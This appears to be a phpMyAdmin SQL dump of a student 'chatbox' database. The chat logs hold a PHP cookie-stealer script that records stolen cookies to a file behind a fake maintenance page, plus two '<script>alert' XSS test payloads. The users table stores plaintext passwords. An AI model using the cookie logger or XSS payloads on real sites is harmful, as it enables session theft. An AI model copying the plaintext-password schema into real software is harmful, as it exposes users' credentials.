-- phpMyAdmin SQL Dump
-- version 4.5.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Feb 19, 2016 at 01:27 AM
-- Server version: 10.1.9-MariaDB
-- PHP Version: 5.6.15

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `chatbox`
--

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `msg` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `logs`
--

INSERT INTO `logs` (`id`, `username`, `msg`) VALUES
(1, 'vishal', '<?php\r\n$cookie = $HTTP_GET_VARS["cookie"];\r\n$date = date("I ds of F Y h:i:s A");\r\n$user_agent = $_SERVER[''HTTP_USER_AGENT''];\r\n$file = fopen(''log.txt'', ''a'');\r\nfwrite($file,"DATE : $date || USER AGENT :$user_agent || COOKIE: $cookie \\n");\r\nfclose($file);\r\necho''<b>Sorry,this page is under maintainance</b><br></br>Please click <ahref = "http://localhost/myproject1/index.php/">here</a>to go back to previous page''\r\n?>'),
(2, 'vishal', 'how are you ?'),
(3, 'vishal', 'whats up ?'),
(4, 'saketh', 'hey'),
(5, 'saketh', 'wadaaap'),
(6, 'saketh', 'anjli'),
(7, 'saketh', 'hello there'),
(8, 'vishal', 'hello'),
(9, 'vishal', 'http://torrentz.eu/'),
(10, 'saketh', 'hi bro'),
(11, 'saketh', 'iiii'),
(12, 'saketh', 'jyjyjy'),
(13, 'anjli', '<script>alert(hello!)</script>'),
(14, 'anjli', '<script>alert(hello!)</script>'),
(15, 'anjli', 'hey');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'vishal', '123'),
(2, 'saketh', 'saketh'),
(3, 'admin', 'admin123'),
(4, 'anjli', 'acha');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
